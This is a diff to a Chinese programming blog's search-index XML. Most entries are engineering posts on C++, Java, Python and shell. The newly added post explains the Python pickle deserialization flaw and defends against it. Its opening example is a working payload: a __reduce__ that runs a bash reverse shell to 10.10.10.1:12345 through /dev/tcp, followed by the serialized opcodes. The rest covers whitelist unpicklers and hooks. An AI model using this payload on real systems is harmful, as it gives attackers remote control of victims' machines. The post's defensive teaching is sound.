@@ -1,13 +1,55 @@
 <search>
     
      <entry>
+        <title>飞哥讲代码24：从Python Pickle漏洞说起</title>
+        <url>http://lanlingzi.cn/post/technical/2021/0313_code/</url>
+        <categories>
+          <category>技术</category>
+        </categories>
+        <tags>
+          <tag>软件开发</tag><tag>python</tag>
+        </tags>
+        <content type="html">  《泾溪》&amp;ndash; 杜荀鹤
+泾溪石险人兢慎，终岁不闻倾覆人。
+却是平流无石处，时时闻说有沉论。
+ 案例 有次同事找我看个Python的安全问题。测试代码是这样的：
+import pickle import os class Test(object): def __reduce__(self): cmd = &amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34; return (os.system,(cmd,)) if __name__ == &amp;#34;__main__&amp;#34;: test = Test() bs = pickle.dumps(test) pickle.loads(bs) 这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。
+目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。
+漏洞分析 pickle在python的官方介绍中有一段这样的介绍:
+ Warning The pickle module is not secure. Only unpickle data you trust.
+It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
+Consider signing data with hmac if you need to ensure that it has not been tampered with.
+ 简单翻译一下：只对你信任数据进行unpickle，因为可以构建恶意的pickle数据，在unpickle时会执行任何代码，要么考虑采用hmac对数据签名检查。
+pickle是一种基于栈的编程语言，目前发展到python3.8已有5个版本协议。我们使用python2先看一下案例中的代码序列化会生成什么（python3中dumps类型是bytes而在python2是str）:
+cposix system p0 (S&amp;#39;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#39; p1 tp2 Rp3 . 这是pickle语言指令，能执行这种指令是PVM(Pickle Virtul Machine)，Python运行环境也是一个PVM，它由下面三部分组成：
+ 指令处理器(Instruction processor)：解释与执行指令，遇到.结束 栈区(stack)：数据处理过程中的暂存区，通过进出栈完成数据操作 标签区(memo)：数据索引或者标记，全生命周期存储数据，以Key/Value存储数据  结合上面生成的内容来看，它有如下指令：
+ c：读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将module.object作为可调用对象压入到栈中。注：os模块在linux下其实是posix (：标记对象压入到栈中, 常搭配t指令一起使用, 以便产生一个元组 t：从堆栈中弹出对象，创建一个包含弹出对象除了(的元组对象 S：后面跟字符串，遇到换行将内容压入到栈中 R：将之前压入栈中的元组和可调用对象全部弹出，将该元组作为可调用参数的对象并执行该对象，并把执行结果压入到栈中 .：结束整个pickle反序列化过程 p1~p3：将栈顶数据存入memo中，后面的数字是编号  当然pickle还有其它的指令，这里就不再一一列出了，更多的指令可以查看pickle的源码pickle.py。
+pickle反序列化漏洞出在__reduce__函数上，当采用C语言定义Python扩展类型时，若想pickle此类型，则需要告诉python如何pickle它们。一旦 __reduce__函数定义，pickle序列化时会被调用，它要么返回一个代表全局名称的字符串，要么返回一个元组。这个元组包含2到6个元素，其中包括：
+ 一个可调用的对象，用于重建对象时调用 一个参数元素，供那个可调用对象使用 被传递给 __setstate__ 的状态， 可选 一个产生被pickle的列表元素的迭代器，可选 一个产生被pickle的字典元素的迭代器，可选 一个可以调用的callable，参数为(obj, state)，可选，3.8才新增的  就是由于个这个元组，跟pickle中的指令R可被利用之机：&amp;ldquo;该元组作为可调用参数的对象并执行该对象&amp;rdquo;，如果这个元组有恶意代码，则可以调用而产生风险。虽然__reduce__返回只能是一个可调用对象，但可以结合os.system，subprocess.run，exec来执行任一命令或代码，几乎能做任何事了。
+解决办法 正如python官方对pickle的介绍说明，只对信任的数据unpickle，对数据数字签名检查。但通常数字签名只限于自产自销的场景。打开pickle的源码来看，事实上还有另一个方法。python定义了Unpickler的接口，关键在于可以覆写find_class，下面是标准库的默认实现：
+def find_class(self, module, name): # Subclasses may override this. sys.audit(&amp;#39;pickle.find_class&amp;#39;, module, name) if self.proto &amp;lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] __import__(module, level=0) if self.proto &amp;gt;= 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name) 默认实现的find_class函数会自动导入模块，并且还兼容python2时fix_imports。若覆写，采用对导入模块做白名单检查控制，不允许导入像os.system等可以执行命令或代码能力，则问题已基本可以解决。那这个函数什么时机被调用呢？从代码搜索来看有4处调用此函数，他们是在解释指令的地方。如案例中的c指令导入模块时，就会调用它。
+import pickle class WhiteListUnpickler(pickle.Unpickler): def find_class(self, module, name): self.check_safe_module(module, name) return super().find_class(module, name) def check_safe_module(module, name): # 检查是否在白名单 if module != &amp;#39;__main__&amp;#39;: raise pickle.UnpicklingError(&amp;#34;&amp;#39;%s.%s&amp;#39; is forbidden&amp;#34; % (module, name)) bs = b&amp;#39;....&amp;#39; # 需要unpickler的内容 file = io.BytesIO(bs) WhiteListUnpickler(file).load() 上面的代码示例只允许__main__模块调用，采用白名单谨慎列出安全的模块则可以规避安全问题。但这需要调用者生成WhiteListUnpickler类，对业务代码有侵入性。那有没有一种对上层调用不感知的修改？有:
+import pickle def safe_load(file, *, fix_imports=True, encoding=&amp;#34;ASCII&amp;#34;, errors=&amp;#34;strict&amp;#34;, buffers=None): return WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers, encoding=encoding, errors=errors).load() def safe_loads(s, *, fix_imports=True, encoding=&amp;#34;ASCII&amp;#34;, errors=&amp;#34;strict&amp;#34;, buffers=None): file = io.BytesIO(s) return WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers, encoding=encoding, errors=errors).load() pickle.load = safe_load pickle.loads = safe_loads # 后面的代码调用pickle.loads时，真实调用的safe_loads python是动态语言，任何模块、对象、函数都是可能动态替换的，不光如此，还可以动态给类/实例增加方法或成员变量。
+自动加载 前面通过safe_loads替换了标准库的实现，但我们还需要解决一个问题，如何让替换的代码先于业务代码执行？不好的做法是所有替换逻辑封装一个API，让业务在启动时最开始的地方调用一下。那有没有一种对上层不感知的自动加载？有。
+对于C程序，通过设置LD_PRELOAD环境变量可以先加载一个动态库，替换系统函数或者进程中其它导出符号的函数。Python是否也有一种机制？Python的玩法有些不一样，提供了另一种机制。参见官方文档site —— 指定域的配置钩子。对机制简述如下：
+ 标准库有一个site.py文件，它会在python启动时先于业务脚本执行 site.py会扫描site-packages目录下所有.pth扩展名的文件 执行这些文件中代码(写法有要求)，并把它返回的path加入到sys.path中，以便能import  这就相当留下一个钩子，可以完成第三方模块导入时的初始化。利用这个机制，同样可以完成需要替换的函数先于业务代码自动加载。site机制如此的强大，其实也是一个非常大的安全隐患。因为我们通过pip install来安装第三方库，也可能写入pth文件，若它是一个恶意库或被篡改了，鬼知道它会做什么呢。前一段时间刷新闻看到pypi仓库清理了5000多个有问题的库。
+假定我们需要替换多个标准库的函数实现，若一个个通过pickle.loads = safe_loads这类方式来替换看起来有点比较丑陋，有没有一种可以比较好玩的方法？有：
+class Hook: def __init__(self): self._hook_to_orig = dict() self._orig_to_hook = dict() def register(self, obj, attr): &amp;#34;&amp;#34;&amp;#34;注册hook函数&amp;#34;&amp;#34;&amp;#34; full_name = &amp;#39;.&amp;#39;.join([obj.__name__, attr]) def wrapper(new_attr): self._orig_to_hook[full_name] = new_attr old_attr = getattr(obj, attr) setattr(obj, attr, new_attr) self._hook_to_orig[new_attr.__name__] = old_attr return new_attr return wrapper def get_orig_func(self): &amp;#34;&amp;#34;&amp;#34;获取原始函数&amp;#34;&amp;#34;&amp;#34; frame = sys._getframe(1) if frame and frame.f_code.co_name in self._hook_to_orig: return self._hook_to_orig[frame.f_code.co_name] else: raise Exception(&amp;#34;`original` must be called from a hooked function&amp;#34;) hook = Hook() # 示例，对os.system进行hook @hook.register(os, &amp;#39;system&amp;#39;) def hook_system(cmd): raise Exception(&amp;#34;forbid execute the function&amp;#34;) # 示例，对open进行hook @hook.register(buildins, &amp;#39;open&amp;#39;) def hook_open(*arg, **argv): orig = get_orig_func() # 对参数检查，如检查文件路径是否合法  return orig(*arg, **argv) 代码不算很难，Hook类主要提供两个函数（注：代码只做演示，未考虑一些异常场景）：
+ register：装饰器函数，用于注册hook的函数，保存与原始函数映射关系 get_orig_func：用于获取原始函数  假定把上面的代码放在一个叫hook.py文件中，创建一个hook.pth放在site-packages目录下，它通过runpy.run_module执行hook.py，则可以完成了各种hook，前面的pickle的扩展也可以采用此方法，完成自动加载，并且可以进步在find_class修改，查找已被替换的安全函数，而不是原始函数。
+当然上面的演示只是让替换现有函数看起来美观一些，若应用层代码能拿到hook对象，还是可以找回来原始函数，这就是可以绕开了安全检查（逃逸）。若避免逃逸还需要禁止各种可能的绕过：比如禁止导入hook模块，禁上执行hook代码，禁止执行被hook函数的源码等等。
+再扩展一下，基于上述的机制，我们可以实现一套安全库，用于尽可能减少代码出现潜在的安全风险，把已知经验沉淀下来：比如路径检查，执行命令检查，端口检查，反序列化检查，代码执行检查，xml实体攻击检查，高风险函数禁用等等。我们搞安全，不仅仅是要做CheckList，更加要沉淀代码复用。
+结语 代码安全问题随处可见，犯错的成本很低。道路千万条，安全第一条，通过框架/CBB来减少代码层面的安全风险是一条比较好的路。正好本文开头的诗句所讲的，兢慎减少风险，平流容易大意。做为一名程序员，无论如何，我们要先记住不信任任何外部输入，树立安全风险意识。
+</content>
+    </entry>
+    
+     <entry>
         <title>飞哥讲代码23：C/C&#43;&#43;内存空洞</title>
         <url>http://lanlingzi.cn/post/technical/2021/0307_code/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 背景 C/C&#43;&#43;把内存管理权限交给了程序员。自由越大责任越大。如果内存只借不还，则产生内存泄露。如果随意借了还得不及时，则可能产生内存空洞。
 前一段时间定位某一组件(C&#43;&#43;代码)的性能问题。现网会开启atop记录此机器的资源使用，发现此组件进程最后内存的虚拟内存(VIRT)达到达8.3G，常驻内存(RES)达到4.2G。而在实验室对比测试的内存占用也就100M多。区别在于实验室测试环境运行时间不长，而出问题的是长时间运行的。
@@ -71,7 +113,7 @@ ACE_Cached_Mem_Pool_Node只一个成员变量：
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 本文虽是C&#43;&#43;代码讲解，但JDK也有对应的两种实现，学习Java的同学也可阅读一并了解一下。
 背景 在多线程的并发模型中，无论是CSP还是Actor模式，都需要借助一个通道来在多个线程间传递消息来通讯。队列在计算机中是非常重要的一种数据结构，队列典型的特征是先进先出（FIFO），符合流水线业务流程。在进程间通信、网络通信之间经常采用队列做缓存，缓解数据处理压力。
@@ -120,7 +162,7 @@ push(const T&amp;amp; data) { Node *n = new Node(data); while (1) { n-&amp;gt;ne
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 本文虽分析的是C&#43;&#43;源码，但是对Evnoy的设计思想分析，并不影响其它语言开发者阅读。
 案例 Envoy是Service Mesh框架Istio推荐的SideCar，基于C&#43;&#43;开发(大量使用了Google开源C&#43;&#43;项目absl)，具有高性能的特点，被广大微服务框架爱好者所熟悉。它的高性能一方面也源自它的优秀线程模型，我们可以通过这篇 Envoy为什么能战胜Ngnix——线程模型分析篇 可以进一步了解它的设计思路。这是对Envoy架构师的 博文 翻译，原文内容较深入较长，总结如下：
@@ -156,7 +198,7 @@ void InstanceImpl::registerThread(Event::Dispatcher&amp;amp; dispatcher, bool ma
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 案例 这次我们还是通过对Drogon的实现分析，一起来窥探与学习一下C&#43;&#43;模板特性。
 Drogon文档中介绍『基于template实现了简单的反射机制，使主程序框架、控制器(controller)和视图(view)完全解耦』。先看一下官方文档中的样例代码：
@@ -209,7 +251,7 @@ template &amp;lt;typename T&amp;gt; struct CanConvertFromStringStream { private:
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 案例 元旦哪里去不了，就呆在家里折腾VIM配置之后又看了一些C&#43;&#43;的开源项目。国人开发的C&#43;&#43; web框架 drogon 在techempower上霸榜。techempower是一个专门给web框架做性能排名的网站。drogon在 Round19测试 中，综合成绩排第一。
 drogon是基于C&#43;&#43;14/17，采用CMake构建，跨平台，全异步，自带高性能模板引擎CSP，基于模板实现了简单的反射机制的Web框架。
@@ -222,7 +264,7 @@ int i = 0; // 其中i是左值，0是临时值，就是右值 const int &amp;amp
  值只有类别(category)的划分，变量只有类型(type)的划分 值不一定拥有身份 (identity)，也不一定拥有变量名（例如表达式中间结果 i &#43; j &#43; k）  值类别(value category)可以分为两种：
  左值(lvalue, left value)是能被取地址、不能被移动的值 右值(rvalue, right value)是表达式中间结果/函数返回值（可能拥有变量名，也可能没有）  引用类型(reference type)属于一种变量类型(variable type), 引用类型变量的初始化和其他的值类型（非引用类型）变量不同：
  创建时，必须显式初始化，和指针不同，不允许空引用 (null reference)；但可能存在 悬垂引用 (dangling reference) 相当于是其引用的值的一个别名(alias)。例如，对引用变量的赋值运算 (assignment operation)会赋值到其引用的值上 一旦绑定了初始值，就不能重新绑定到其他值上了，和指针不同，赋值运算不能修改引用的指向  引用类型可以分为两种：
- 左值引用(l-ref, lvalue reference) 用 &amp;amp; 符号引用左值（但不能引用右值） 右值引用(r-ref, rvalue reference) 用 &amp;amp;&amp;amp; 符号引用右值（也可以移动左值）  void f(Data&amp;amp; data); // 1, 左值引用 void f(Data&amp;amp;&amp;amp; data); // 2, 右值引用 Data data; Data&amp;amp; data1 = data; // OK Data&amp;amp; data1 = Data{}; // not compile: 左值引用变量 data1 在初始化时，不能绑定右值 Data{} Data&amp;amp;&amp;amp; data2 = Data{}; // OK Data&amp;amp;&amp;amp; data2 = data; // not compile: 右值引用变量 data2 在初始化时，不能绑定左值 data Data&amp;amp;&amp;amp; data2 = std::move(data); // OK, 通过 std::move() 将左值转为右值引用 f(data); // 1, OK， 左值 f(Data{}); // 2, OK ，右值 f(data1); // 1, OK, 左值引用 f(data2); // 2, OK, 右值引用 C&#43;&#43; 还支持了常引用(c-ref, const reference)，同时接受左值/右值进行初始化：
+ 左值引用(l-ref, lvalue reference) 用 &amp;amp; 符号引用左值（但不能引用右值） 右值引用(r-ref, rvalue reference) 用 &amp;amp;&amp;amp; 符号引用右值（也可以移动左值）  void f(Data&amp;amp; data); // 1, 左值引用 void f(Data&amp;amp;&amp;amp; data); // 2, 右值引用 Data data; Data&amp;amp; data1 = data; // OK Data&amp;amp; data1 = Data{}; // not compile: 左值引用变量 data1 在初始化时，不能绑定右值 Data{} Data&amp;amp;&amp;amp; data2 = Data{}; // OK Data&amp;amp;&amp;amp; data2 = data; // not compile: 右值引用变量 data2 在初始化时，不能绑定左值 data Data&amp;amp;&amp;amp; data2 = std::move(data); // OK, 通过 std::move() 将左值转为右值引用 f(data); // 1, OK， 左值 f(Data{}); // 2, OK ，右值 f(data1); // 1, OK, 左值引用 f(data2); // 1, OK, data2是右值引用，但是一个左值 C&#43;&#43; 还支持了常引用(c-ref, const reference)，同时接受左值/右值进行初始化：
 void g(const Data&amp;amp; data); // 常引用 g(data); // 接受左值 g(Data{}); // 接受右值，Data{}这类也通常也叫纯右值 常引用和右值引用都能接受右值的绑定，其区别:
  通过右值引用/常引用 初始化的右值，都可以将生命周期扩展 (lifetime extension) 到绑定（扩展/延长到）该右值的引用的生命周期， 初始化时 绑定了右值后，右值引用 可以修改 引用的右值，而 常引用 不能修改  const Data&amp;amp; data1 = Data{}; // OK: extend lifetime data1.modify(); // not compile: const Data&amp;amp;&amp;amp; data2 = Data{}; // OK: extend lifetime data2.modify(); // OK: non-const 如果函数重载同时接受 右值引用/常引用 参数，编译器 优先重载 右值引用参数：
 void f(const Data&amp;amp; data); // 1, data is c-ref void f(Data&amp;amp;&amp;amp; data); // 2, data is r-ref f(Data{}); // 2, prefer 2 over 1 for rvalue 内容有些多，本文不再摘抄std:move与std:forword的说明，请继续参见深入浅出 C&#43;&#43; 11 右值引用
@@ -250,7 +292,7 @@ vector&amp;lt;_Tp, _Allocator&amp;gt;::emplace_back(_Args&amp;amp;&amp;amp;... _
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>shell</tag>
         </tags>
         <content type="html"> 案例 上周一位同学找我看个问题，故事是这样的：
  安全设计要求，需要对SSH远程执行做命令白名单 在authorized_keys中配置wrapper脚本对执行的命令进行检查 问题是部分命令能正常执行，部分命令执行之后不退出卡住  那个wrapper脚本的关键逻辑如下:
@@ -294,7 +336,7 @@ class A { public: const int func(const int* const param) const {return 0;} }; �
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 案例代码来源我们某产品：
 public void rollbackOrgPackage(Map&amp;lt;String, Object&amp;gt; oldOrgPackage, String orgName) throw ApigwException, ParseException { if (StringUtil.isEmpyt(orgName)) { throw new BackParameterException(...); } for (Entry&amp;lt;String, Object&amp;gt; orgPackage: oldOrgPackage.entrySet()) { switch ( orgPackage.getKey() ) { case &amp;#34;orgAssets&amp;#34;: List&amp;lt;TApigwOrgAsset&amp;gt; orgAssets = (List&amp;lt;ApigwOrgAsset&amp;gt;) orgPackage.getValue(); List&amp;lt;TApigwAssetContent&amp;gt; orgAssetContents = (List&amp;lt;TApigwAssetContent&amp;gt;) oldOrgPackage.get(&amp;#39;orgAssetContents&amp;#39;); try { if (orgAssets != null) { for (TApigwOrgAsset orgAsset: orgAssets) { aTApigwAssetContentMapper.deleteByPrimaryKey(orgAsset.getAstid()); aTApigwOrgAssetMapp.deleteByOrgName(orgName, orgAsset.getZone()); } } if (orgAssets == null || orgAssetContents == null) { break; } for(TApigwOrgAsset aTApigwOrgAsset: orgAssets){ aTApigwOrgAssetMapper.insert(aTApigwOrgAsset); } for(TApigwAssetContent orgAssetConent: orgAssetContents){ aTApigwAssetConentMapper.insert(orgAssetConent); } } catch (Excetption e) { threw new ApigwExcepiton(...) } break; case &amp;#34;orgService&amp;#34;: ... // 省略  case &amp;#34;orgConfigGroups&amp;#34;: ... // 省略  case &amp;#34;orgVariables&amp;#34;: ... // 省略  } } } 上面的代码存在典型的switch惊悚的坏味道。每个Switch块较大，嵌套比较深，在Swith中又存在for循环。还存其它的坏味道：
@@ -373,7 +415,7 @@ spring.jpa.properties.hibernate.jdbc.batch_size=500 spring.jpa.properties.hibern
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 案例一，代码摘抄某外部培训材料，主要代码逻辑是打印每课成绩，并找出学生非F级别课程统计平均分数：
 class CourseGrade { public String title; public char grade; } public class ReportCard { public String studentName; public ArrayList&amp;lt;CourseGrade&amp;gt; cliens; public void printReport() { System.out.println(&amp;#34;Report card for &amp;#34; &#43; studentName); System.out.println(&amp;#34;------------------------&amp;#34;); System.out.println(&amp;#34;Course Title Grade&amp;#34;); Iterator&amp;lt;CourseGrade&amp;gt; grades = cliens.iterator(); CourseGrade grade; double avg = 0.0d; while (grades.hasNext()) { grade = grades.next(); System.out.println(grade.title &#43; &amp;#34; &amp;#34; &#43; grade.grade); if (!(grade.grade == &amp;#39;F&amp;#39;)) { avg = avg &#43; grade.grade - 64; } } avg = avg / cliens.size(); System.out.println(&amp;#34;------------------------&amp;#34;); System.out.println(&amp;#34;Grade Point Average = &amp;#34; &#43; avg); } } 上面的代码有哪些问题呢:
@@ -413,7 +455,7 @@ foo = [&amp;#34;A&amp;#34;, &amp;#34;a&amp;#34;, &amp;#34;b&amp;#34;, &amp;#34;B
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 上周参加张逸老师解构领域驱动设计培训。课上老师提到传统的设计是贫血模型类&#43;事务脚本（逻辑过程），并给出一个贫血类设计的案例代码。凭记忆记录如下，有三个类：
  Customer: 顾客 Wallet: 顾客的钱包 Paperboy: 收银员  实现的主体逻辑是，收银员向顾客收钱。
@@ -447,7 +489,7 @@ public class Customer { public void pay(float payment) { if (myWallet.isEnough(p
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>python</tag>
         </tags>
         <content type="html"> 案例 下面的代码是来自我们新构建的服务，采用Python语言开发。案例故事是这样：
 开始： 某同学最先开发某功能，需要读取服务的配置文件，代码如下，是代码直接读取文件取配置项：
@@ -477,7 +519,7 @@ Commit机制不是万金油：
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>python</tag>
         </tags>
         <content type="html"> 案例 目前写Python的同学越来越多了，但动态语言无类型约束，导致Commit时难以review。先来看一段我们的代码：
 优化前的代码：
@@ -511,7 +553,7 @@ Python的Typing标注是在3.5版本引入，其语法是可以归纳为两点�
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 下面代码都来源于部门某一中间件产品(java)的源码，代码风格（此风格非格式风格而是逻辑思维风格）并且在整个源码中具有普遍性。
 代码一：
@@ -553,7 +595,7 @@ for(int a : list) { if (!...) { // 反着写  continue; } } Switch优化
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 最近在走读某一老产品的代码，发现存在一个普遍不好的实践，代码类似如下：
 public class Class1 { private Map&amp;lt;String, String&amp;gt; store = new HashMap&amp;lt;&amp;gt;(); private List&amp;lt;Class2&amp;gt; queue = new ArrayList&amp;lt;&amp;gt;(); //... 省略其它的字段与其Getter/Setter方法 } 此类的特点是：只有一些集合字段与其Getter/Setter，而对字段的使用却是如下：
@@ -587,7 +629,7 @@ public void method1() { // ... 省略其它逻辑  // 在其它的类中的方�
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 在这个月，我曾经分析处理两个与数据操作相关的性能问题。根因是缺少对表的严谨设计。通过搜索些资料，便有此博文分享给大家。
 案例一：某服务对接Oracle，在某些场景下出现读取表数据失败。现象是日志会报如下堆栈信息：
@@ -625,7 +667,7 @@ Oracle数据库的LOB字段用于存储大数据对象的字段类型，包括BL
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 两周前，参与某一老产品的性能优化有如下收获：
  同事说，我配置了 1000个线程 ，但是总消耗时间还是需要 10分钟 左右，似乎没有真正的并发。 经过分析代码，狂改一通代码，结果是：只配置了 32个线程 ，总消耗时间下降至 44秒 。  这个产品已有一定的年头，采用Java开发，但Maven配置的编译source/target还是 1.6（直接把配置修改为1.8整个产品编译会有问题。对于老产品，稳定优先，维护者并没有太多的动力升级到1.8，因为一升级需要对所有历史分支都升级并验证）。 为了线程安全，代码中大量地存在如下Double-Check写法(伪代码)，无法享受Java高版本带来的红利，并不高效：
@@ -662,7 +704,7 @@ Go语言而不依赖于Linux系统，而是在它的Runtime上实现MPG模型，
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 去年在做BCM切换进行如火如荼时，一位兄弟找到我，有如下对话：
  ■■(工号) 2019-08-27 14:50
@@ -701,7 +743,7 @@ public class PooledByteBufTest { public static void main(String[] args) throws I
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>shell</tag>
         </tags>
         <content type="html"> 案例 这次就不上代码了。情况是这样的，我们某一新产品，采用微服务架构，每个微服务独立的源码仓：
  每个服务都要支持手工安装，DF部署，容器部署。 每个服务都要支持修改密钥，密码等。 每个服务都要支持容灾，WatchDog等  上面的功能实现都需要采用Shell脚本，当搞定一个服务时，只需要复制到其它的服务，是最为常见的做法。但这种做法也带来了大量的重复，导致维护极其困难。真是拷贝一时爽，维护成了火葬场。主要问题表现：
@@ -738,7 +780,7 @@ declare -r CUR_PATH=$( cd &amp;#34;$( dirname &amp;#34;${BASH_SOURCE[0]}&amp;#34
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 下面的代码来自我们某一平台产品前端源码(Java语言)中：
 private static Map&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt; constructConstrainMap() { Map&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt; typeConstrainMap = new HashMap&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt;(); Map&amp;lt;String, String&amp;gt; imageConstrainPatternMap = new HashMap&amp;lt;String, String&amp;gt;(); imageConstrainPatternMap.put(&amp;#34;allowdPatten&amp;#34;, &amp;#34;^[a-zA-Z0-9_~.=@-]$&amp;#34;); imageConstrainPatternMap.put(&amp;#34;allowdMin&amp;#34;, &amp;#34;1&amp;#34;); imageConstrainPatternMap.put(&amp;#34;allowdMax&amp;#34;, &amp;#34;256&amp;#34;); imageConstrainPatternMap.put(&amp;#34;allowdValue&amp;#34;, null); imageConstrainPatternMap.put(&amp;#34;noEcho&amp;#34;, &amp;#34;false&amp;#34;); imageConstrainPatternMap.put(&amp;#34;description&amp;#34;, &amp;#34;com.huawei.....&amp;#34;); typeConstrainMap.put(TPropType.IAA_S_IMAGE_ID.value(), imageConstrainPatternMap) Map&amp;lt;String, String&amp;gt; netWorkConstrainPatternMap = new HashMap&amp;lt;String, String&amp;gt;(); // 省略 put ...  Map&amp;lt;String, String&amp;gt; containerConstrainPatternMap = new HashMap&amp;lt;String, String&amp;gt;(); // 省略 put ...  // 省略 其它的Constrain代码 ... } 上面的代码在一个方法中构造了16个Constrain，它是提供给BME控件用于输入框的校验。显然代码出现了重复（相似），也较容易想到采用外部配置文件方式来简化样板代码，但采用什么配置方式呢？
@@ -769,7 +811,7 @@ try (InputStream is = new FileInputStream(&amp;#34;constrains.xml&amp;#34;)) { J
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag><tag>设计模式</tag>
         </tags>
         <content type="html"> 案例 下面的代码来自我们某一平台产品源码(Java语言)中：
 public class RemoteExecuteHandler { public Future&amp;lt;RemoteExecuteResult&amp;gt; handleDownload() throws SspException { try { initSshClient(); Future&amp;lt;RemoteExecuteResult&amp;gt; feture = downloadPackage(); return feture; } catch (SspException e) { LOGGER.error(&amp;#34;CMC download package failed&amp;#34;, e); closeSshClient(); throw e; } } public Future&amp;lt;RemoteExecuteResult&amp;gt; handleLoad() throws SspException { try { initSshClient(); Future&amp;lt;RemoteExecuteResult&amp;gt; feture = loadPackage(); return feture; } catch (SspException e) { LOGGER.error(&amp;#34;Load site package failed&amp;#34;, e); closeSshClient(); throw e; } } // 下面还有几个类似的方法，不再一一列表 } 上面的代码较直观地出现重复（相似），除了执行具体的动作与日志不一样，都是样板代码。当然还存在其它问题:
@@ -805,7 +847,7 @@ RemoteExecuteReceiver receiver = new RemoteExecuteReceiver(); DownloadCommand do
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 下面的代码来自我们某一平台产品源码(Java语言)中（代码一）：
 public class ServiceFactory { private static ServiceFactory instance = new ServiceFactory(); public static ServiceFactory getInstance() { return instance; } @Getter @Setter @Autowired private AppTemplateDesignServie appTemplateDesignServie; @Getter @Setter @Autowired private AppTemplateExportServie appTemplateExportServie; // 下面还有十多个Service对象注入，提供Getter与Setter，不再一一列出 } 再来看另一平台服务的代码(Java语言)（代码二）：
@@ -846,7 +888,7 @@ IoC的意义是为了解除耦合，IoC创建对象的控制权进行转移，�
           <category>技术</category>
         </categories>
         <tags>
-          <tag>软件开发</tag>
+          <tag>软件开发</tag><tag>java</tag>
         </tags>
         <content type="html"> 案例 下面的代码来自我们某一中间件产品源码(Java语言)中（写法一）：
 // ConcurrentMap&amp;lt;String, AtomicLong&amp;gt; rejectMessageCounts = new ConcurrentHashMap&amp;lt;&amp;gt;(); private AtomicLong getRejectMessageCount(String serviceName) { AtomicLong rejectMessageCount = rejectMessageCounts.get(serviceName); if (null == rejectMessageCount) { rejectMessageCount = new AtomicLong(); AtomicLong currentValue = rejectMessageCounts.putIfAbsent(serviceName, rejectMessageCount); if ( null != currentValue) { rejectMessageCount = currentValue; } } return rejectMessageCount; } 上面的代码是线程安全的，但不够简洁，Java 1.8的ConcurrentMap提供computeIfAbsent()方法，可以简化为（写法二）：
